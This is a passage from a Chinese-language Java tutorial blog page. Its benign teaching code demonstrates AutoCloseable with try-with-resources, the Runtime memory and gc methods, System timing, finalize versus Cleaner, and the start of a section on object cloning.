class="string">&quot;【open】获取消息发送连接资源&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【close】关闭消息发送通道&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.open()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【*** 发送消息 ***】&quot;</span> + <span class="built_in">this</span>.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test23</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">NetMessage</span> <span class="variable">nm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NetMessage</span>(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        nm.send();</span><br><span class="line">        nm.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    此时实现了一个模拟代码的处理流程，但有个问题，既然所有的资源完成处理之后都必须进行关闭操作，那么能否实现一种自动关闭的功能呢？在这样的要求下，推出了 AutoCloseable  访问接口，这个接口是在 JDK1.7  的时候提供的，并且该接口只提供有一个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关闭方法: <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception；</span><br></pre></td></tr></table></figure><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073905.jpg"                      alt="image-20220809233120912"                ></p><p>​    按照图上的分析，我们这么写应该就可以自动关闭</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AutoCloseable接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>; <span class="comment">//消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetMessage</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span>, AutoCloseable &#123; <span class="comment">//实现消息的处理机制</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NetMessage</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">open</span><span class="params">()</span> &#123; <span class="comment">//获取资源链接</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【open】获取消息发送连接资源&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.open()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【*** 发送消息 ***】&quot;</span> + <span class="built_in">this</span>.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【close】关闭消息发送通道&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test23</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">NetMessage</span> <span class="variable">nm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NetMessage</span>(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">        nm.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073906.jpg"                      alt="image-20220809233546760"                ></p><p>​    要想实现自动关闭处理，除了要使用AutoCloseable之外，还需要结合异常处理完成才可以。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073908.jpg"                      alt="image-20220809233921260"                ></p><p>范例：实现自动关闭处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AutoCloseable接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span> <span class="keyword">extends</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>; <span class="comment">//消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetMessage</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span> &#123; <span class="comment">//实现消息的处理机制</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NetMessage</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">open</span><span class="params">()</span> &#123; <span class="comment">//获取资源链接</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【open】获取消息发送连接资源&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.open()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;【*** 发送消息 ***】&quot;</span> + <span class="built_in">this</span>.msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【close】关闭消息发送通道&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test23</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">IMessage</span> <span class="variable">nm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NetMessage</span>(<span class="string">&quot;mes9s0&quot;</span>)) &#123;</span><br><span class="line">            nm.send();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在整个的过程中，只有结合了 AutoCloseable ，整个程序才能实现自动的Close 调用，这种操作形式是在 JDK1.7 之后新增的处理，在以后的章节之中会接触到资源的关闭问题，往往都会见到 AutoCloseable 接口的使用。</p><p>​    <strong>这个接口要和异常捆绑在一起明确使用才能正确完成。</strong></p><h4 id="Runtime类"><a href="#Runtime类" class="headerlink" title="Runtime类"></a>Runtime类</h4><p>​    Runtime 描述的是运行时的状态，也就是说在整个的 JVM 之中，Runtime 类是唯一一个与 JVM 运行状态有关的类，并且都会默认提供有一一个该类的实例化对象。</p><p>​    由于在最每一个 JVM 进程里面只允许提供有一个 Runtime 类的对象，所以这个类的构造方法被默认私有化了，那么就证明该类使用的是单例设计模式，并且单例设计模式一定会提供有一个 static 方法获取本类。</p><p>​    以下是 Runtime 类的主要操作形式。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073909.jpg"                      alt="image-20220813222556463"                ></p><p>​    由于 Runtime 类属于单例设计模式，如果要想获取实例化对象，那么就可以依靠类中的 getRuntime() 方法完成:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取实例化对象: <span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>​    通过这个类中的 availableProcessors 方法可以获取本机的 CPU 内核数.</p><p>范例:获取Runtime类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取实例化对象</span></span><br><span class="line">        System.out.println(run.availableProcessors());<span class="comment">//10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    但是除了以上的方法之外，在 Runtime 类里面还提供有以下四个重要的操作方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取最大可用内存空间: <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">maxMemory</span><span class="params">()</span>默认的配置为本机系统的<span class="number">4</span>分之 <span class="number">1</span>。</span><br><span class="line">获取可用内存空间: <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">totalMemory</span><span class="params">()</span>默认的配置为本机系统的<span class="number">64</span>分之 <span class="number">1</span>。</span><br><span class="line">获取空闲内存空间: <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">freeMemory</span><span class="params">()</span></span><br><span class="line">手工进行GC处理:<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gc</span><span class="params">()</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取实例化对象</span></span><br><span class="line">        System.out.println(run.availableProcessors());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;1、MAX_MEMORY: &quot;</span>+run.maxMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;2、TOTAL_MEMORY: &quot;</span>+run.totalMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;3、FREE_MEMORY：&quot;</span>+run.freeMemory());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073915.jpg"                      alt="image-20220813223925936"                ></p><p>​    4294967296/1024/1024/1024</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//获取实例化对象</span></span><br><span class="line">        System.out.println(run.availableProcessors());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;【1】、MAX_MEMORY: &quot;</span> + run.maxMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】、TOTAL_MEMORY: &quot;</span> + run.totalMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;【1】、FREE_MEMORY：&quot;</span> + run.freeMemory());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;x&lt;<span class="number">3000</span>;x++)&#123;</span><br><span class="line">            str += x;  <span class="comment">// 产生大量的垃圾空间</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;【2】MAX_MEMORY:&quot;</span> + run.maxMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;【2】TOTAL_MEMORY:&quot;</span> + run.totalMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;【2】FREE MEMORY;&quot;</span> + run.freeMemory());</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line">        run.gc();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;【3】MAX_MEMORY:&quot;</span> + run.maxMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】TOTAL_MEMORY:&quot;</span> + run.totalMemory());</span><br><span class="line">        System.out.println(<span class="string">&quot;【3】FREE_MEMORY:&quot;</span> + run.freeMemory());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073916.jpg"                      alt="image-20220813224724681"                ></p><p>​    什么是 GC？如何处理？</p><p>​    GC（Garbage Collector) 垃圾收集器，是可以由系统自动调用的垃圾释放功能，或者使用 Runtime 类的 gc()手工调用。</p><h4 id="System类"><a href="#System类" class="headerlink" title="System类"></a>System类</h4><p>​    System 类是一直陪伴着我们学习的程序类，之前使用的系统输出采用的就是System 类中的方法，而后在 System 类里面也定义有一些其它的处理方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">数组拷贝：<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">arraycopy</span><span class="params">(Object sre. <span class="type">int</span> srcPos, Object dest, <span class="type">int</span> destPos, <span class="type">int</span> length)</span>;</span><br><span class="line"></span><br><span class="line">获取当前的日期时间数值：<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">currentTimeMillis</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">进行垃圾回收：<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">gc</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>范例：操作耗时的统计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">3000</span>; x++) &#123;</span><br><span class="line">            str += x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;耗时： &quot;</span> + (end - start));<span class="comment">//87</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在 System 类里面会发现也提供有一个 gc()方法:</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073917.jpg"                      alt="image-20220813225444601"                >    </p><p>​    但是这个 gc() 方法并不是重新定义的新方法，而是继续调用了 Runtime 类中的 gc() 操作 （Runtime getRuntime().gc();）。</p><h4 id="Cleaner类"><a href="#Cleaner类" class="headerlink" title="Cleaner类"></a>Cleaner类</h4><p>​    Cleaner 是在 JDK 1.9 之后提供的一个对象清理操作，其主要的功能是进行 finialize() 方法的替代。</p><p>​    在 C++ 语言里面有两种特殊的函数：构造函数、析构函数(对象手工回收)，在 Java里面所有的垃圾空间都是通过 GC 自动回收的，所以很多情况下是不需要使用这类析构函数的，也正是因为如此，所以 Java 并没有提供这方面支持。</p><p>​    但是 Java 本身依然提供了给用户收尾的操作，每一个实例化对象在回收之前至少给它一个喘息的机会，最初实现对象收尾处理的方法是 Object 类中所提供的 finalize()方法，这个方法的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated(since=&quot;9&quot;)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable</span><br></pre></td></tr></table></figure><p>​    该替换指的是不建议继续使用这个方法了，而是说子类可以继续使用这个方法名称。</p><p>​    但是这个方法上最大的特点是抛出了一个 Throwable 异常类型，而这个异常类型分为两个子类型：Error、Exception，平常所处的都是 Exception。</p><p>范例：观察传统回收</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Member</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Member</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;在一个雷电交加的日子里，林强诞生&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【回收】最终你一定要死的&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;我还要再活500年&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test26</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Member</span> <span class="variable">mem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Member</span>(); <span class="comment">//诞生</span></span><br><span class="line">        mem = <span class="literal">null</span>; <span class="comment">//成为垃圾</span></span><br><span class="line">        System.gc();</span><br><span class="line">        System.out.println(<span class="string">&quot;太阳照常升起&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    但是从 JDK 1.9  开始，这操作已经不建议使用了，而对于对象回收释放。从 JDK1.9 开始建议开发者使用 AutoCloseable 或者使用 java.lang .ref.Cleaner 类进行回收处理( Cleaner 也支持有 AutoCloseable 处理)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.ref.Cleaner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Member</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Member</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【构造】在一个雷电交加的日子里，林强诞生&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123; <span class="comment">//执行清楚的时候执行的是此操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;【回收】最终一定要死的&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemberCleaning</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123; <span class="comment">//实现清楚的处理</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Cleaner</span> <span class="variable">cleaner</span> <span class="operator">=</span> Cleaner.create(); <span class="comment">//创建一个清除处理</span></span><br><span class="line">    <span class="keyword">private</span> Member member;</span><br><span class="line">    <span class="keyword">private</span> Cleaner.Cleanable cleanable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MemberCleaning</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.member = <span class="keyword">new</span> <span class="title class_">Member</span>(); <span class="comment">//创建新对象</span></span><br><span class="line">        <span class="built_in">this</span>.cleanable = <span class="built_in">this</span>.cleaner.register(<span class="built_in">this</span>, <span class="built_in">this</span>.member); <span class="comment">//注册使用的对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.cleanable.clean(); <span class="comment">//启动多线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test26</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">MemberCleaning</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MemberCleaning</span>())&#123;</span><br><span class="line">            <span class="comment">//执行相关代码</span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在新一代的清楚回收处理的过程之中，更多的情况下考虑的是多线程的使用，即：为了防止有可能造成的延迟处理，所以许多对象回收前的处理都是通过单独一个线程完成的。</p><h4 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h4><p>​    所谓的对象克隆指的就是对象的复制，而且属于全新的复制。即:使用已有对象内容创建一个新的对象，如果要想进行对象克隆需要使用到 Object 类中提供的 clone()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 